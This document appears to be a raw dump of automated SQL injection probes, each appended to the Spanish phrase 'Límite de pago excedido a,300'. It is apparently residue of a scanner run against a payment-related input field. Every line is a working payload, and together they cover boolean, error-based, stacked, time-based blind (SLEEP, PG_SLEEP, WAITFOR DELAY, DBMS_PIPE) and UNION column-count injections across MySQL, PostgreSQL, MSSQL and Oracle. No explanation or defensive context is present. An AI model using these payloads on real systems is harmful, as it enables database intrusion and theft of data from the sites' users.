Límite de pago excedido a,300\",(\"\'))\"\'.
Límite de pago excedido a,300\'mbPFIq<\'\">abKNBI
Límite de pago excedido a,300) AND 8628=4215 AND (1788=1788
Límite de pago excedido a,300) AND 1784=1784 AND (8928=8928
Límite de pago excedido a,300 AND 7528=8377
Límite de pago excedido a,300 AND 1784=1784
Límite de pago excedido a,300 AND 9993=4414-- YjsN
Límite de pago excedido a,300 AND 1784=1784-- HpbP
Límite de pago excedido a,300\') AND 8416=7813 AND (\'JYxz\'=\'JYxz
Límite de pago excedido a,300\') AND 1784=1784 AND (\'xyki\'=\'xyki
Límite de pago excedido a,300\' AND 2551=5126 AND \'OLgd\'=\'OLgd
Límite de pago excedido a,300\' AND 1784=1784 AND \'CRiS\'=\'CRiS
Límite de pago excedido a,300%\' AND 4985=7768 AND \'%\'=\'
Límite de pago excedido a,300%\' AND 1784=1784 AND \'%\'=\'
Límite de pago excedido a,300) AND (SELECT 3307 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(3307=3307,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (2801=2801
Límite de pago excedido a,300 AND (SELECT 3307 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(3307=3307,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
Límite de pago excedido a,300 AND (SELECT 3307 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(3307=3307,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- lmjD
Límite de pago excedido a,300\') AND (SELECT 3307 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(3307=3307,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (\'TMNz\'=\'TMNz
Límite de pago excedido a,300\' AND (SELECT 3307 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(3307=3307,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'oMXL\'=\'oMXL
Límite de pago excedido a,300%\' AND (SELECT 3307 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(3307=3307,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'%\'=\'
Límite de pago excedido a,300) AND 2833=CAST((CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (2833=2833) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)) AS NUMERIC) AND (4327=4327
Límite de pago excedido a,300 AND 2833=CAST((CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (2833=2833) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)) AS NUMERIC)
Límite de pago excedido a,300 AND 2833=CAST((CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (2833=2833) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)) AS NUMERIC)-- bXrS
Límite de pago excedido a,300\') AND 2833=CAST((CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (2833=2833) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)) AS NUMERIC) AND (\'xhsK\'=\'xhsK
Límite de pago excedido a,300\' AND 2833=CAST((CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (2833=2833) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)) AS NUMERIC) AND \'nJur\'=\'nJur
Límite de pago excedido a,300%\' AND 2833=CAST((CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (2833=2833) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)) AS NUMERIC) AND \'%\'=\'
Límite de pago excedido a,300) AND 1026=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1026=1026) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(118)+CHAR(113))) AND (4111=4111
Límite de pago excedido a,300 AND 1026=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1026=1026) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(118)+CHAR(113)))
Límite de pago excedido a,300 AND 1026=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1026=1026) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(118)+CHAR(113)))-- czer
Límite de pago excedido a,300\') AND 1026=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1026=1026) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(118)+CHAR(113))) AND (\'HJrt\'=\'HJrt
Límite de pago excedido a,300\' AND 1026=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1026=1026) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(118)+CHAR(113))) AND \'mrSv\'=\'mrSv
Límite de pago excedido a,300%\' AND 1026=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1026=1026) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(118)+CHAR(113))) AND \'%\'=\'
Límite de pago excedido a,300) AND 2142=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (2142=2142) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (5682=5682
Límite de pago excedido a,300 AND 2142=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (2142=2142) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
Límite de pago excedido a,300 AND 2142=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (2142=2142) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- gnXH
Límite de pago excedido a,300\') AND 2142=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (2142=2142) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (\'YhvC\'=\'YhvC
Límite de pago excedido a,300\' AND 2142=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (2142=2142) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND \'fRkG\'=\'fRkG
Límite de pago excedido a,300%\' AND 2142=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (2142=2142) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND \'%\'=\'
Límite de pago excedido a,300);SELECT SLEEP(5)#
Límite de pago excedido a,300;SELECT SLEEP(5)#
Límite de pago excedido a,300\');SELECT SLEEP(5)#
Límite de pago excedido a,300\';SELECT SLEEP(5)#
Límite de pago excedido a,300%\';SELECT SLEEP(5)#
Límite de pago excedido a,300);SELECT PG_SLEEP(5)--
Límite de pago excedido a,300;SELECT PG_SLEEP(5)--
Límite de pago excedido a,300\');SELECT PG_SLEEP(5)--
Límite de pago excedido a,300\';SELECT PG_SLEEP(5)--
Límite de pago excedido a,300%\';SELECT PG_SLEEP(5)--
Límite de pago excedido a,300);WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300;WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300\');WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300\';WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300%\';WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(104)||CHR(106)||CHR(67),5) FROM DUAL--
Límite de pago excedido a,300;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(104)||CHR(106)||CHR(67),5) FROM DUAL--
Límite de pago excedido a,300\');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(104)||CHR(106)||CHR(67),5) FROM DUAL--
Límite de pago excedido a,300\';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(104)||CHR(106)||CHR(67),5) FROM DUAL--
Límite de pago excedido a,300%\';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(104)||CHR(106)||CHR(67),5) FROM DUAL--
Límite de pago excedido a,300) AND SLEEP(5) AND (2120=2120
Límite de pago excedido a,300 AND SLEEP(5)
Límite de pago excedido a,300 AND SLEEP(5)-- KOAh
Límite de pago excedido a,300\') AND SLEEP(5) AND (\'IDLJ\'=\'IDLJ
Límite de pago excedido a,300\' AND SLEEP(5) AND \'vrnA\'=\'vrnA
Límite de pago excedido a,300%\' AND SLEEP(5) AND \'%\'=\'
Límite de pago excedido a,300) AND 3423=(SELECT 3423 FROM PG_SLEEP(5)) AND (3713=3713
Límite de pago excedido a,300 AND 3423=(SELECT 3423 FROM PG_SLEEP(5))
Límite de pago excedido a,300 AND 3423=(SELECT 3423 FROM PG_SLEEP(5))-- rkaa
Límite de pago excedido a,300\') AND 3423=(SELECT 3423 FROM PG_SLEEP(5)) AND (\'FJhc\'=\'FJhc
Límite de pago excedido a,300\' AND 3423=(SELECT 3423 FROM PG_SLEEP(5)) AND \'NwHL\'=\'NwHL
Límite de pago excedido a,300%\' AND 3423=(SELECT 3423 FROM PG_SLEEP(5)) AND \'%\'=\'
Límite de pago excedido a,300) WAITFOR DELAY \'0:0:5\' AND (5826=5826
Límite de pago excedido a,300 WAITFOR DELAY \'0:0:5\'
Límite de pago excedido a,300 WAITFOR DELAY \'0:0:5\'-- rxYu
Límite de pago excedido a,300\') WAITFOR DELAY \'0:0:5\' AND (\'CnOg\'=\'CnOg
Límite de pago excedido a,300\' WAITFOR DELAY \'0:0:5\' AND \'XYHj\'=\'XYHj
Límite de pago excedido a,300%\' WAITFOR DELAY \'0:0:5\' AND \'%\'=\'
Límite de pago excedido a,300) AND 8826=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(102)||CHR(112)||CHR(97),5) AND (6258=6258
Límite de pago excedido a,300 AND 8826=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(102)||CHR(112)||CHR(97),5)
Límite de pago excedido a,300 AND 8826=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(102)||CHR(112)||CHR(97),5)-- RhDy
Límite de pago excedido a,300\') AND 8826=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(102)||CHR(112)||CHR(97),5) AND (\'cRJU\'=\'cRJU
Límite de pago excedido a,300\' AND 8826=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(102)||CHR(112)||CHR(97),5) AND \'zSZx\'=\'zSZx
Límite de pago excedido a,300%\' AND 8826=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(102)||CHR(112)||CHR(97),5) AND \'%\'=\'
Límite de pago excedido a,300) ORDER BY 1-- DoYE
Límite de pago excedido a,300) ORDER BY 3880-- XriJ
Límite de pago excedido a,300) UNION ALL SELECT NULL-- wkNc
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL-- pggF
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL-- fPfX
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL-- ZDQh
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- EiLK
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ApVY
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dxAY
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Tlwg
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zeSi
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mbDX
Límite de pago excedido a,300 ORDER BY 1-- pRuo
Límite de pago excedido a,300 ORDER BY 3268-- aTwv
Límite de pago excedido a,300 UNION ALL SELECT NULL-- dMjV
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL-- hBek
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL-- xrJj
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL-- xVSm
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- DUQB
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- KYzL
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BpfD
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Mbns
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cdIV
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BkHR
Límite de pago excedido a,300 ORDER BY 1-- aLvV
Límite de pago excedido a,300 ORDER BY 6035-- nLBG
Límite de pago excedido a,300 UNION ALL SELECT NULL-- eWvD
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL-- NcWs
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL-- ZXgs
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL-- aWKP
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bBxh
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- tRHr
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KBMe
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- qlZB
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ajkd
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gcmQ
Límite de pago excedido a,300\') ORDER BY 1-- vUJo
Límite de pago excedido a,300\') ORDER BY 4299-- eadn
Límite de pago excedido a,300\') UNION ALL SELECT NULL-- MIZL
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL-- zjPF
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL-- jZfa
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL-- gYqQ
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ieHw
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- zERq
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Jjhw
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- SMbM
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RtFU
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IuCO
Límite de pago excedido a,300\' ORDER BY 1-- SiGb
Límite de pago excedido a,300\' ORDER BY 8809-- hmTG
Límite de pago excedido a,300\' UNION ALL SELECT NULL-- jsOj
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL-- BBYr
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL-- NBfZ
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL-- kPhH
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- PpfM
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- NVKe
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LTJG
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AqnI
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zeLq
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Jvkl
Límite de pago excedido a,300%\' ORDER BY 1-- qJgV
Límite de pago excedido a,300%\' ORDER BY 1194-- HkAt
Límite de pago excedido a,300%\' UNION ALL SELECT NULL-- fKjp
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL-- UJMQ
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL-- TvGr
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL-- OtFJ
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- cxsi
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- Fmim
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zmcC
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VVXt
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zWTZ
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sbUv
Límite de pago excedido a,300) ORDER BY 1#
Límite de pago excedido a,300) ORDER BY 2017#
Límite de pago excedido a,300) UNION ALL SELECT NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 ORDER BY 1#
Límite de pago excedido a,300 ORDER BY 4115#
Límite de pago excedido a,300 UNION ALL SELECT NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 ORDER BY 1#
Límite de pago excedido a,300 ORDER BY 5228#
Límite de pago excedido a,300 UNION ALL SELECT NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\') ORDER BY 1#
Límite de pago excedido a,300\') ORDER BY 7001#
Límite de pago excedido a,300\') UNION ALL SELECT NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\' ORDER BY 1#
Límite de pago excedido a,300\' ORDER BY 6526#
Límite de pago excedido a,300\' UNION ALL SELECT NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300%\' ORDER BY 1#
Límite de pago excedido a,300%\' ORDER BY 5070#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
Límite de pago excedido a,300%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
